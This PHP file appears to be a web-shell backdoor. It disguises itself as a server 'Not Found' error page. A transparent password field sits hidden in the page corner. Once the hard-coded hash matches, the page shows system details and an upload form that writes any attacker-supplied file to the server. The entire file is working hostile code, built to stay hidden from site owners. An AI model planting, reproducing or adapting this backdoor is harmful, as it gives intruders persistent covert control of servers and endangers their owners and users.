<?php
session_start();

if($_SESSION["adm"]){
echo '<b>Namesis<br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Success !!!</b><br><br>';
 }	else { echo '<b>Upload Fail !!!</b><br><br>';
 }}
}
if($_POST["p"]){
$p = $_POST["p"];

$pa = sha1(md5($p));
if($pa=="a81188542757f86688e8ec3ac288d9f736e8fce0"){
$_SESSION["adm"] = 1;

}
}
?>
</HEAD>
<BODY>
<H1>Not Found</H1>
The requested document was not found on this server.
<P>
<HR>
<ADDRESS>
Web Server at  port 80 
</ADDRESS>
	<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
		<input style="border:0;background:transparent;position:absolute;bottom:0;right:0;" type="password" name="p" required />
	</form>

